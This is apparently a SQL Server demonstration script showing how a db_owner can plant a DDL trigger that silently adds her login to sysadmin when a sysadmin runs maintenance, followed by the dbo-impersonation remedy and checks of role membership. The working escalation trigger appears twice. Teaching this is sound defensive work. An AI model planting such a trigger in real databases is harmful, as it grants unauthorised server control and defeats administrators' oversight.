use master
go

CREATE LOGIN DebbieOwner WITH PASSWORD = 'StrrOOn6p@swörd'
go
USE WideWorldImporters
go
CREATE USER DebbieOwner
ALTER ROLE db_owner ADD MEMBER DebbieOwner
go

-- Debbie starts working and adds a table.
EXECUTE AS LOGIN = 'DebbieOwner'
go
CREATE TABLE TableOne(id int NOT NULL,
                     data nvarchar(128) NOT NULL,
                     CONSTRAINT pk_TableOne PRIMARY KEY (id)
)
INSERT TableOne(id, data)
   SELECT object_id, name FROM sys.objects
go
REVERT
go

use maintenance
go
EXECUTE [dbo].[DatabaseIntegrityCheck]
    @Databases = 'WideWorldImporters',
    @LogToTable = 'Y'

EXECUTE [dbo].[DatabaseBackup]
    @Databases = 'WideWorldImporters',
    @Directory = N'\\sweco.se\sw\IT\Backup\SQL\SqlBackup',
    @BackupType = 'FULL',
    @Verify = 'Y',
    @CleanupTime = 65,
    @CheckSum = 'Y',
    @Compress = 'Y',
    @LogToTable = 'Y'
go

EXECUTE [dbo].[IndexOptimize]
    @Databases = 'WideWorldImporters',
    @FragmentationHigh = 'INDEX_REBUILD_ONLINE,INDEX_REORGANIZE',
    @UpdateStatistics = 'ALL',
    @TimeLimit = 12600,
    @LockTimeout = 10,
    @LogToTable = 'Y'
go

use WideWorldImporters
go


-- The server DBA runs some token database maintenance.
--DBCC CHECKDB(WideWorldImporters) WITH NO_INFOMSGS
--BACKUP DATABASE WideWorldImporters TO DISK = 'C:\temp\WideWorldImporters.bak' WITH INIT
--ALTER INDEX ALL ON TableOne REBUILD
---- UPDATE STATISTICS TableOne
--go
-- Check who are members of sysadmin?

SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go

-- Hm, what is Debbie up to now?
EXECUTE AS LOGIN = 'DebbieOwner'
go
CREATE OR ALTER TRIGGER EvilDdlTri ON DATABASE 
   FOR DDL_DATABASE_LEVEL_EVENTS AS
   IF is_srvrolemember('sysadmin') = 1
      EXEC('USE master ALTER SERVER ROLE sysadmin ADD MEMBER DebbieOwner')
go
REVERT
go





use maintenance
go

EXECUTE [dbo].[IndexOptimize]
    @Databases = 'WideWorldImporters',
    @FragmentationHigh = 'INDEX_REBUILD_ONLINE,INDEX_REORGANIZE',
    @UpdateStatistics = 'ALL',
    @TimeLimit = 12600,
    @LockTimeout = 10,
    @LogToTable = 'Y',
	@ExecuteAsUser = 'dbo'
go

use WideWorldImporters
go













-- Run the DB maintenance again. Run the first two statements and 
-- check sysadmin again.
DBCC CHECKDB(WideWorldImporters) WITH NO_INFOMSGS
BACKUP DATABASE WideWorldImporters TO DISK = 'C:\temp\WideWorldImporters.bak' WITH INIT

SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go
-- Now run the index rebuild and check again.
ALTER INDEX ALL ON TableOne REBUILD
SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go
-- That's bad! Take DebbieOwner out of sysadmin.
ALTER SERVER ROLE sysadmin DROP MEMBER DebbieOwner
SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go


-- Also test statistics update.
UPDATE STATISTICS TableOne
SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go

-- That also fired the DDL trigger. Remove DebbieOwner again.
ALTER SERVER ROLE sysadmin DROP MEMBER DebbieOwner
SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go

-- The remedy is to impersonate dbo.
EXECUTE AS USER = 'dbo'
go
ALTER INDEX ALL ON TableOne REBUILD
UPDATE STATISTICS TableOne
go
REVERT
go
SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go

-- But why did this work out? Let's look at our tokens.
SELECT type, usage, name FROM sys.user_token
SELECT type, usage, name FROM sys.login_token
go
-- And look at them when impersonating dbo.
EXECUTE AS USER = 'dbo'
SELECT type, usage, name FROM sys.user_token
SELECT type, usage, name FROM sys.login_token
go
REVERT

-- That is, when impersonating a datbase user, we are sandbox into the 
-- current database and lose all our server permissions.

-- But could Debbie counterstrike with help of REVERT?
EXECUTE AS LOGIN = 'DebbieOwner'
go
CREATE OR ALTER TRIGGER EvilDdlTri ON DATABASE 
   FOR DDL_DATABASE_LEVEL_EVENTS AS
   REVERT
   IF is_srvrolemember('sysadmin') = 1
       EXEC('USE master ALTER SERVER ROLE sysadmin ADD MEMBER DebbieOwner')
go
REVERT
go

-- Run index maintenance again:
EXECUTE AS USER = 'dbo'
go
ALTER INDEX ALL ON TableOne REBUILD
UPDATE STATISTICS TableOne
go
REVERT
go
SELECT name FROM sys.server_principals
WHERE is_srvrolemember('sysadmin', name) = 1
go
-- No, a REVERT only works against impersonation in the same scope.

-- Let's drop Debbie's evil trigger before we close.
DROP TRIGGER EvilDdlTri ON DATABASE
